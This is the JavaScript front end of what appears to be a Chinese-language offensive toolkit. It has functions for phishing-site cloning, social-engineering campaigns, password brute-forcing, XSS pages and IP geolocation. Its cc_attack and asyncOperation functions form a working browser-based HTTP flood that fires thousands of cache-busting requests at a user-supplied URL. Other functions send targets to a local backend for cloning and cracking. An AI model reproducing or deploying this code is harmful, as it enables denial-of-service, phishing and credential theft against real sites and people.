
var remote = "http://127.0.0.1:5555";

function to_social() {
    var i = document.getElementById('page');
    i.src = "./socialEngine";
}

function to_web_virus() {
    var i = document.getElementById('page');
    i.src = "./web_virus";
}

function to_attack_pwd() {
    var i = document.getElementById('page');
    i.src = "./passwd_attack";
}

function social_attack(attack_type) {
    var user = JSON.parse(document.cookie).user;
    var pwd = JSON.parse(document.cookie).pwd;
    var xhr = new XMLHttpRequest();
    xhr.open("GET",remote+"/api/"+attack_type+"/"+user+"/"+pwd,true);
    xhr.send();
    xhr.onload=function()
    {
        if (xhr.readyState === 4) {
            var response = xhr.responseText;
            showAlert("<h2 style='color:red'>收到信息:</h2>"+'请访问URL:<br/>' + remote + '/'+response , null)

            var run = setInterval(function() 
            {
                var get_message = new XMLHttpRequest();
                get_message.open(
                    'GET',remote+"/run/"+response , true
                    );
                get_message.send();
                get_message.onload = function() 
                {
                    if (get_message.readyState === 4) 
                    {
                        var r = get_message.responseText;
                        if (r.replace('\n','') != 'none')
                        {
                            showAlert("<h2 style='color:red'>收到信息:</h2><br />"+r, null)
                        }
                    }
                }
            } , 400); //使用短轮询，不是 websocket 用不起，而是短轮询更有性价比.
        }
    }
}
function web_clone() {
    var url = prompt('输入需要克隆的地址: (不要加 http://或https://)')
    if (url == null) {
        return;
    }
    else {
        var user = JSON.parse(document.cookie).user;
        var pwd = JSON.parse(document.cookie).pwd;
        var xhr = new XMLHttpRequest();
        xhr.open('GET',remote+"/WebClone/"+url+"/"+user+"/"+pwd , true);
        xhr.send();
        xhr.onload=function() {
            if (xhr.readyState == 4) {
                var response = xhr.responseText;
                console.log(response)
                showAlert('Please Visit URL: <a herf="_black">'+remote+'/w/'+response+'</a>' , null)
            }
        }
    }
}

function downloadBlob(data, fileName) {
    // 创建Blob对象
    const blob = new Blob([data]);
  
    // 创建临时URL
    const url = URL.createObjectURL(blob);
  
    // 创建a元素
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = fileName;
  
    // 将a元素添加到DOM中并模拟点击
    document.body.appendChild(a);
    a.click();
  
    // 移除a元素并撤销临时URL
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

function make_qrcode() {

    var url = prompt('请输入需要生成二维码的URL: ')
    if (url != null) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST' , remote+"/qr_code" , true);
        xhr.send(url);
        xhr.responseType = 'arraybuffer'; // 设置响应类型为arraybuffer
        xhr.onload = function() {
            downloadBlob(xhr.response, url+".png");
        }
    }
}

function pwd_attack() {
    var url = document.getElementById('url').value;
    var body = document.getElementById('http_body').value;
    var check = document.getElementById('check').value;

    try 
    {
        var xhr = new XMLHttpRequest();
        xhr.open('POST' , remote + '/pwd_attack' , true);
        xhr.send(url + '\n' + check + '\n' + body);
        xhr.onload = function()
        {
            var responseText = xhr.responseText;
            if (responseText == 'ok') {
                showAlert('程序正在后台运行，破解的成功与否需要时间的检验，请耐心等候' , null)
            }
        }
    }
    catch (e) {
        showAlert('错误: '+e , null)
    }
}

function to_cc_attack() {
    var i = document.getElementById('page');
    i.src = "./cc_attack";
}

var put_log_number = 0;

function asyncOperation(url) {
    var log_view = document.getElementById('log_view');
    return new Promise((resolve, reject) => {
        for (var i = 0 ; i < 20 ;i++) {
            i++;
            var dom = document.createElement('img');
            dom.src = url + new Date().getTime();
            dom.style.width = '0px';
            dom.style.height = '0px';
            document.body.appendChild(dom);
            document.body.removeChild(dom);

            setTimeout(() => {
                if (i % 1000 == 0) {
                    log_view.innerHTML += '攻击网站: '+url+'<br />'
                }
            }, 100);
        }
    });
}


function cc_attack() {
    var url = document.getElementById('url').value;
    for (var i = 0 ; i < 1000 ; i++) {
        asyncOperation(url).then(result => {
            console.log('ok')
        });
    }
}

function to_ip_location() {
    var i = document.getElementById('page');
    i.src = "./ip_location";
}

function ip_location() {
    var ip = document.getElementById('ip').value;
    var ip_info = document.getElementById('ip_info');
    ip_info.innerHTML = '';

    var lat = '';
    var lon = '';

    var xhr = new XMLHttpRequest();
    xhr.open('GET' , remote+'/get_ip_location/'+ip , true);
    xhr.send();
    xhr.onload = function() {
        var json = JSON.parse(xhr.responseText);
        ip_info.innerHTML += '<p>IP: '+ip+'查询结果: </p>';
        for (var key in json) {
            /**
             * 家人们谁懂啊，我发现这个api调用会把 香港和台湾列为国家.
             * 所以说我要改一改
             */
            if (json.hasOwnProperty(key)) { 
                var btn_1 = document.createElement('button');
                var btn_2 = document.createElement('button');
                btn_1.innerText = key;

                btn_1.className = 'btn_key';
                btn_2.className = 'btn_key';

                if (key == 'country' && json[key] == 'Hong Kong') {
                    json[key] = 'China';
                }
                if (key == 'country' && (json[key] == 'TaiWan' || json[key] == 'Tai Wan')) {
                    json[key] = 'China'; 
                }
                if (key == 'lat') {
                    lat = json[key];
                    var key_name = 'lat (纬度)'
                    btn_1.innerText = key_name;
                    btn_2.innerText = json['lat'];
                }
                if (key == 'lon') {
                    lon = json[key];
                    var key_name = 'lon (经度)'
                    btn_1.innerText = key_name;
                    btn_2.innerText = json['lon'];
                } else {
                    console.log(1)
                }
                if (json[key] == '') {
                    btn_2.innerText = '-';
                } else {
                    btn_2.innerText = json[key];
                }
                ip_info.appendChild(btn_1);
                ip_info.appendChild(btn_2);
                ip_info.innerHTML += '<br />';
            }
        }      
    }
}
function to_xss_attack() {
    var i = document.getElementById('page');
    i.src = './xss_attack';
}

function download_file(path) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET' , path , true);
    xhr.send();
    xhr.onload = function() {
        downloadBlob(xhr.response , path)
    }
}